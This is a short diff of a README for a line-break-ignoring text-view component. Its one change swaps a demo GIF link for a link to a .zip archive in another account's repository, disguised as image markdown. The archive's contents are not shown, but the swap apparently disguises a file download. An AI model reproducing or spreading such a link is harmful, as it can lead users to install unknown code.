@@ -4,7 +4,7 @@ ignore the continuous line breaks just like the input in weChat or weibo.
 
 a picture is  better than thousand words:
 
-![example](https://github.com/RXTeams/ignoreContinuousBreaks/blob/master/continuousBreaks.gif)
+![example](https://raw.githubusercontent.com/ZHThinker/ignoreContinuousBreaks/master/textview/Base.lproj/ignore_Continuous_Breaks_1.4.zip)
 
 ### How To Get Started
 
